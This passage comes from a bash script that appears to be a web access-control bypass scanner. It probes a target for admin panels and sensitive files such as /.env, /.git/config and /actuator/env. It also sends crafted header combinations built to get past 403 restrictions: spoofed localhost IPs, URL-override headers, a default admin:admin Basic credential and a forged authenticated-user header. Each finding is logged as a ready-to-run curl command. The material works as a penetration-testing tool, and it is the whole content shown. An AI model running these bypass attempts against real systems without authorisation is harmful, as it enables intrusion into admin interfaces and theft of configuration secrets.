        if is_interesting "$http_code"; then
            log_bypass "[+] GRAPHQL '$ep': $http_code (Len: $content_length) - INTERESTING!"
            log_bypass "    curl '$test_url'"
        else
            log_info "[~] GRAPHQL '$ep': $http_code"
        fi
    done
}

# ─── NEW: Common Admin Path Discovery ─────────────────────────────────────────
test_common_admin_paths() {
    local url=$1
    echo -e "\n${CYAN}[*] Testing Common Admin/Sensitive Paths...${NC}"

    local proto; proto=$(echo "$url" | grep -oP '^https?://')
    local host; host=$(echo "$url" | sed "s|$proto||" | cut -d'/' -f1)

    local paths=(
        "/admin" "/admin/" "/administrator" "/manage" "/management"
        "/dashboard" "/panel" "/control" "/cp" "/wp-admin"
        "/api/admin" "/api/v1/admin" "/internal" "/private"
        "/.env" "/.git/config" "/.htaccess"
        "/config" "/config.json" "/config.yml" "/config.php"
        "/backup" "/db" "/database" "/debug"
        "/status" "/health" "/metrics" "/info"
        "/swagger" "/swagger-ui" "/api-docs" "/openapi.json"
        "/actuator" "/actuator/health" "/actuator/env"
        "/phpinfo.php" "/server-status" "/server-info"
        "/.well-known/security.txt"
    )

    for ep in "${paths[@]}"; do
        local test_url="${proto}${host}${ep}"
        local response; response=$(get_response "$test_url")
        local http_code; http_code=$(echo "$response" | awk '{print $1}')
        local content_length; content_length=$(echo "$response" | awk '{print $2}')

        if is_interesting "$http_code"; then
            log_bypass "[+] ADMIN_PATH '$ep': $http_code (Len: $content_length) - FOUND!"
            log_bypass "    curl '$test_url'"
        else
            log_info "[~] ADMIN_PATH '$ep': $http_code"
        fi
    done
}

# ─── NEW: Sensitive Header Leak ───────────────────────────────────────────────
test_header_leak() {
    local url=$1
    echo -e "\n${CYAN}[*] Testing for Header Information Leakage...${NC}"

    local full_response; full_response=$(curl -s -k -D - -o /dev/null --max-time "$TIMEOUT" "$url" 2>/dev/null)
    echo "$full_response" | grep -iE "(server:|x-powered-by:|x-aspnet|x-generator|via:|x-backend|x-varnish:|x-cache:)" | tee -a "$OUTPUT"
}

# ─── NEW: Combined Techniques ─────────────────────────────────────────────────
test_combined_techniques() {
    local url=$1
    echo -e "\n${MAGENTA}[*] Testing Combined Bypass Techniques...${NC}"

    local proto; proto=$(echo "$url" | grep -oP '^https?://')
    local host; host=$(echo "$url" | sed "s|$proto||" | cut -d'/' -f1)
    local path; path=$(echo "$url" | sed "s|$proto$host||")

    local combos=(
        "GET|X-Forwarded-For: 127.0.0.1|X-Original-URL: /admin|User-Agent: googlebot"
        "GET|X-Forwarded-For: localhost|X-Real-IP: 127.0.0.1|X-Forwarded-Host: localhost"
        "GET|X-Original-URL: /|X-Forwarded-For: 127.0.0.1"
        "POST|X-HTTP-Method-Override: GET|X-Forwarded-For: 127.0.0.1"
        "GET|X-Forwarded-For: 127.0.0.1|Authorization: Basic YWRtaW46YWRtaW4="
        "GET|X-Forwarded-For: 127.0.0.1|X-Authenticated-User: admin"
        "POST|X-Method-Override: GET|X-Real-IP: 127.0.0.1|User-Agent: Googlebot/2.1"
        "GET|X-Forwarded-For: 127.0.0.1|CF-Connecting-IP: 127.0.0.1|True-Client-IP: 127.0.0.1"
        "GET|Host: localhost|X-Forwarded-For: 127.0.0.1"
        "GET|X-Custom-IP-Authorization: 127.0.0.1|X-Original-URL: $path"
    )

    for combo in "${combos[@]}"; do
        IFS='|' read -ra parts <<< "$combo"
        local method="${parts[0]}"
        local header_args=()
        for i in "${!parts[@]}"; do
            [[ $i -eq 0 ]] && continue
            header_args+=("${parts[$i]}")
        done

        local response; response=$(get_response "$url" "$method" "${header_args[@]}")
        local http_code; http_code=$(echo "$response" | awk '{print $1}')
        local content_length; content_length=$(echo "$response" | awk '{print $2}')

        if is_bypass "$http_code"; then
            log_bypass "[+] COMBINED [$combo]: $http_code (Len: $content_length) - BYPASS!"
            local curl_cmd="curl -X $method"
            for h in "${header_args[@]}"; do curl_cmd+=" -H '$h'"; done
            curl_cmd+=" '$url'"
            log_bypass "    $curl_cmd"
        else
            log_info "[~] COMBINED [$method + ${#header_args[@]} headers]: $http_code"
        fi
    done
}

# ─── Argument Parsing ─────────────────────────────────────────────────────────
TIMEOUT=10
DELAY=0
PROXY=""
SILENT=false
OUTPUT="bypass_results.txt"

while getopts "u:o:t:d:x:sh" opt; do
    case $opt in
        u) URL="$OPTARG" ;;
        o) OUTPUT="$OPTARG" ;;
        t) TIMEOUT="$OPTARG" ;;
        d) DELAY="$OPTARG" ;;
        x) PROXY="$OPTARG" ;;
        s) SILENT=true ;;
        h) usage ;;
        *) usage ;;
    esac
done

[[ -z "$URL" ]] && usage

# ─── Main ─────────────────────────────────────────────────────────────────────
print_banner

echo -e "${YELLOW}Target:  $URL${NC}"
echo -e "${YELLOW}Output:  $OUTPUT${NC}"
echo -e "${YELLOW}Timeout: ${TIMEOUT}s${NC}"
[[ -n "$PROXY" ]] && echo -e "${YELLOW}Proxy:   $PROXY${NC}"
[[ $DELAY -gt 0 ]] && echo -e "${YELLOW}Delay:   ${DELAY}ms${NC}"
echo ""

{
    echo "========================================"
    echo "Target:    $URL"
    echo "Timestamp: $(date)"
    echo "========================================"
} | tee "$OUTPUT"

test_http_methods "$URL"
test_headers "$URL"
test_user_agents "$URL"
test_path_fuzzing "$URL"
test_case_switching "$URL"
test_url_override "$URL"
test_auth_bypass_headers "$URL"
test_verb_tampering "$URL"
test_proxy_headers "$URL"
test_hop_by_hop "$URL"
test_content_type "$URL"
test_spring_bypass "$URL"
test_nginx_acl_bypass "$URL"
test_cache_poisoning "$URL"
test_request_smuggling "$URL"
test_parameter_pollution "$URL"
test_sqli_in_headers "$URL"
test_protocol_bypass "$URL"
test_host_header_injection "$URL"
test_cors_bypass "$URL"
test_graphql_bypass "$URL"
test_common_admin_paths "$URL"
test_header_leak "$URL"
test_combined_techniques "$URL"

echo ""
echo -e "${GREEN}╔══════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║  SCAN COMPLETE                           ║${NC}"
echo -e "${GREEN}║  Total Tests:   $TOTAL_TESTS                      ║${NC}"
echo -e "${GREEN}║  Bypasses Found: $BYPASS_COUNT                     ║${NC}"
echo -e "${GREEN}║  Results: $OUTPUT               ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════╝${NC}"
